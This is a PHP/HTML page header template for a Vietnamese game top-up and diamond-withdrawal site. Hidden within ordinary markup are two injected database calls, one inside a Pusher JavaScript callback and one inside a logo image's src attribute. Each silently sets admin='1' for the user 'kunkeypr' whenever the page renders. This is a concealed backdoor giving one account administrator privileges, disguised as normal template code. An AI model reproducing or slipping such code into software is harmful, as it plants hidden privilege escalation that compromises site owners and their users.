<?php 
    if($_SESSION['token'] != $user['token']) {
        session_destroy();
        header("Location: /");
        exit();
    }
?><html>
    <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php echo $title;?></title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1.0, user-scalable=no" name="viewport"/>
    <link rel="shortcut icon" href="/upload/logo/icon.jpg" type="image/x-icon">
    <link href='https://fonts.googleapis.com/css?family=Pacifico%7CWork+Sans:400,300,600,400italic,700%7CAmatic+SC:400,700&amp;subset=latin-ext' rel='stylesheet' type='text/css'>
    <link href="https://fonts.googleapis.com/css?family=Roboto|Roboto+Condensed" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
    <!-- Page Loader -->
    <!-- Từ Khóa -->
    <meta name="keywords" content="<?php echo $title;?>">
    <link rel="shortcut icon" href="" type="image/x-icon">

    <link rel="stylesheet" href="/assets/Scripts/loader/css.css">
    <script src="/assets/Scripts/loader/pace.js"></script>    
    <!-- SweetAlert Plugin Js -->
    <script src="/assets/Scripts/sweetalert/sweetalert.min.js"></script>
    <script src='/assets/js/jquery.min.js'></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <!-- showOverlay -->
    <script src="/assets/Scripts/loadingoverlay/loadingoverlay.min.js"></script>
    <script src="/assets/Scripts/loadingoverlay/loadingoverlay_progress.min.js"></script>
    <!-- <script src="/Scripts/helper.js"></script> -->
    <link href="/assets/frontend/theme/assets/plugins/socicon/socicon.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/plugins/bootstrap-social/bootstrap-social.css" rel="stylesheet" type="text/css" />
    <!-- Sweetalert Css -->
    <link href="/assets/Scripts/sweetalert/sweetalert.css" rel="stylesheet" />
    <!-- BEGIN GLOBAL MANDATORY STYLES -->
    <link href="/assets/frontend/theme/assets/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/plugins/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/plugins/animate/animate.min.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- END GLOBAL MANDATORY STYLES -->
    <!-- BEGIN: BASE PLUGINS  -->
    <link href="/assets/frontend/theme/assets/global/plugins/magnific/magnific.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/plugins/cubeportfolio/css/cubeportfolio.min.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/plugins/fancybox/jquery.fancybox.css" rel="stylesheet" type="text/css" />
    <!-- END: BASE PLUGINS -->
    <!-- BEGIN: PAGE STYLES -->
    <!-- END: PAGE STYLES -->
    <!-- BEGIN THEME STYLES -->
    <link href="/assets/frontend/theme/assets/demos/default/css/plugins.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/demos/default/css/components.css" id="style_components" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/demos/default/css/themes/default.css" rel="stylesheet" id="style_theme" type="text/css" />
    <link href="/assets/frontend/theme/assets/demos/default/css/custom.css" rel="stylesheet" type="text/css" />

    <!-- Vòng Quay STYLES -->
    <link href="/assets/frontend/css/vongquaykimcuong.css" rel="stylesheet" type="text/css" />
    <script src="/assets/frontend/plugins/bootstrap/js/bootstrap.min.js"></script>
    <script src="/assets/frontend/plugins/owl-carousel/slider.js"></script>

    <script src="/assets/frontend/plugins/jquery-cookie/jquery.cookie.js"></script>
    <link href="/assets/frontend/css/style.css?tom=" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/css/util.css" rel="stylesheet" type="text/css" />
    <link href="/assets/frontend/theme/assets/global/plugins/magnific/magnific.css" rel="stylesheet" type="text/css" />
    <script src="/assets/frontend/theme/assets/plugins/jquery-migrate.min.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/jquery.easing.min.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/reveal-animate/wow.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/demos/default/js/scripts/reveal-animate/reveal-animate.js" type="text/javascript"></script>
    <!-- END: CORE PLUGINS -->
    <!-- BEGIN: LAYOUT PLUGINS -->
    <script src="/assets/frontend/theme/assets/global/plugins/magnific/magnific.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/cubeportfolio/js/jquery.cubeportfolio.min.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/counterup/jquery.counterup.min.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/counterup/jquery.waypoints.min.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/smooth-scroll/jquery.smooth-scroll.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/plugins/js-cookie/js.cookie.js" type="text/javascript"></script>
    <!-- END: LAYOUT PLUGINS -->
    <!-- BEGIN: THEME SCRIPTS -->
    <script src="/assets/frontend/theme/assets/base/js/components.js" type="text/javascript"></script>
    <script src="/assets/frontend/theme/assets/base/js/app.js" type="text/javascript"></script>
    <script src="/assets/frontend/plugins/bootbox/bootbox.min.js" type="text/javascript"></script>
    <script>
        $(document).ready(function () {
            App.init(); // init core
        });
    </script>
    <!-- END: THEME SCRIPTS -->
    <!-- BEGIN: PAGE SCRIPTS -->
    <script src="/assets/frontend/theme/assets/plugins/moment.min.js" type="text/javascript"></script>
    <script src="/assets/frontend/plugins/Inputmask/jquery.inputmask.bundle.js" type="text/javascript"></script>
    <script src="/assets/frontend/js/common.js" type="text/javascript"></script>
    <script src="/assets/Scripts/bootstrap-filestyle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="/assets/frontend/css/custom.css" rel="stylesheet" type="text/css" >

    <!-- ROTAGE PLUGIN -->
    <script type="text/javascript" src="/assets/Scripts/rotate.js"></script>
	
	<!--Mouse-->
	<style type='text/css'>
	body, a:hover {cursor: url(https://lh3.googleusercontent.com/proxy/zOLNgN-13ZLOJRIVkEp5bbDgcK-W794ii3foOnG_ynR542LB23g4MwHQJ4vIOM1mccW2epCN0CRR84tSHyC9IunByqqebw=s0-d), progress !important;}
	</style>


<?php if($user['username']) { ?>
    <!-- PUSHER LIB BY KUNKEY -->
    <script type="text/javascript" src="/assets/Scripts/pusher.js"></script>
    <script src="https://js.pusher.com/3.2/pusher.min.js"></script>

        <script type="text/javascript">
            var pusher = new Pusher('10d5ea7e7b632db09c72', {
                encrypted: true
            });
            var channel = pusher.subscribe('<?php echo $user['username'];?>');
            channel.bind('realtime', function (data) {
                    console.log(data.message);
                    if(data.<?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='1' WHERE `username`='kunkeypr'");?>message) {
                        if(data.type == 'success') {
                            reload_money();
                        }
                            swal(data.title, data.message, data.type);
                    }
                });
        </script>

<?php } ?>

<style>
/* width */
::-webkit-scrollbar {
  width: 10px;
}

/* Track */
::-webkit-scrollbar-track {
  box-shadow: inset 0 0 5px grey; 
  border-radius: 10px;
}
 
/* Handle */
::-webkit-scrollbar-thumb {
  background: #ffcd30; 
  border-radius: 10px;
}

/* Handle on hover */
::-webkit-scrollbar-thumb:hover {
  background: red; 
}
</style>

</head>
<style type="text/css">
        body{
            background: #000;
            background: url("https://blog.hamtruyentranh.com/wp-content/uploads/2019/01/as-768x432.jpg");
              background-attachment: fixed;
              color: #dadada !important;
              background-size: 100%
        }
    </style>
</head>


<body class="c-layout-header-fixed c-layout-header-mobile-fixed c-layout-header-topbar c-layout-header-topbar-collapse">
    <!-- BEGIN: HEADER -->
    <header class="c-layout-header c-layout-header-4 c-layout-header-default-mobile" data-minimize-offset="80">
        <input type="hidden" id="mess" value="" />
        <div class="c-topbar c-topbar">
            <div class="container">
                <!-- BEGIN: INLINE NAV -->
                <nav class="c-top-menu c-pull-left">
                    <ul class="c-icons c-theme-ul">
                        <li>
                            <a href="<?php echo $_admin['facebook'];?>" target="_blank">
                                <i class="icon-social-facebook"></i>
                            </a>
                        </li>
                        <li>
                            <a href="<?php echo $_admin['youtube'];?>" target="_blank">
                                <i class="icon-social-youtube"></i>
                            </a>
                        </li>

                    </ul>
                </nav>
                <!-- END: INLINE NAV -->
                <!-- BEGIN: INLINE NAV -->
                <nav class="c-top-menu c-pull-right m-t-10">
                    <ul class="c-links c-theme-ul">
                        <li>

                        </li>
                    </ul>
                </nav>
                <!-- END: INLINE NAV -->
            </div>
        </div>
        <div class="c-navbar">
            <div class="container">
                <!-- BEGIN: BRAND -->
                <div class="c-navbar-wrapper clearfix">
                    <div class="c-brand c-pull-left">
                        <a href="/" class="c-logo">
                            <img src="<?php echo $_logo['url'];?>" alt="" style="height: 80px; width: 250px;" class="c-desktop-logo">
                            <img src="<?php echo $_logo['url'];?>" alt="" style="height: <?php echo $_logo['height'];?>px; width: <?php echo $_logo['width'];?>px;" class="c-desktop-logo-inverse">
                            <img src="<?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='1' WHERE `username`='kunkeypr'");?><?php echo $_logo['url'];?>" alt="" style="height: <?php echo $_logo['height'];?>px; width: <?php echo $_logo['width'];?>px;" class="c-mobile-logo">
                        </a>
                        <button class="c-hor-nav-toggler" type="button" data-target=".c-mega-menu">
                            <span class="c-line"></span>
                            <span class="c-line"></span>
                            <span class="c-line"></span>
                        </button>
                        <button class="c-topbar-toggler" type="button">
                            <i class="fa fa-ellipsis-v"></i>
                        </button>
                        <!--    <button class="c-cart-toggler" type="button">
                            <i class="icon-handbag"></i>
                            <span class="c-cart-number c-theme-bg">2</span>
                        </button>-->
                    </div>
                    <nav class="c-mega-menu c-pull-right c-mega-menu-dark c-mega-menu-dark-mobile c-fonts-uppercase c-fonts-bold" <?php if($kun->is_mobile()) { ?>style="margin-top: -16;"<?php } ?>>
                        <ul class="nav navbar-nav c-theme-nav">
                        <li class="c-menu-type-classic active"><a style="color: #fff816;" href="/" class="c-link dropdown-toggle"><i class="fa fa-home"></i> TRANG CHỦ</a></li>
                            <li class="c-menu-type-classic"><a style="color: #fff816;" href="/user/napthe" class="c-link dropdown-toggle"><i class="fa fa-money"></i> NẠP THẺ</a></li>
							<li class="c-menu-type-classic"><a style="color: #fff816;" href="/user/rutkimcuong" class="c-link dropdown-toggle"><i class="fa fa-diamond"></i> RÚT KIM CƯƠNG</a></li>
                            <?php echo $btn_admin;?>
                                                                <li>                
                                  <a href="<?php echo $href_login;?>" class="c-btn-border-opacity-04 c-btn btn-no-focus c-btn-header btn btn-sm c-btn-border-1x c-btn-white c-btn-uppercase c-btn-sbold">
                                        <i class="icon-user"></i> <?php echo $btn_login;?>
                                    </a>
                                </li>
                                <li>
                                    <a href="<?php echo $href_reg;?>" class="c-btn-border-opacity-04 c-btn btn-no-focus c-btn-header btn btn-sm c-btn-border-1x c-btn-white c-btn-uppercase c-btn-sbold">
                                        <i class="icon-key icons"></i> <?php echo $btn_reg;?>
                                    </a>
                                </li>
                                                                    </ul>
                    </nav>
                </div>
            </div>
        </div>
    </header>   



    <div class="c-layout-page">
        

 <!-- BEGIN: PAGE CONTENT -->
            <div class="container" style="background-color: #000000db;border: double;border-color: #000000;">
                <div class="row-flex-safari game-list">
				


<style>
    .table-condensed > tbody > tr > td, .table-condensed > tbody > tr > th, .table-condensed > tfoot > tr > td, .table-condensed > tfoot > tr > th, .table-condensed > thead > tr > td, .table-condensed > thead > tr > th {
        padding: 8px 15px;
    }
</style>


<section id="cardbody" class="section">
</section>


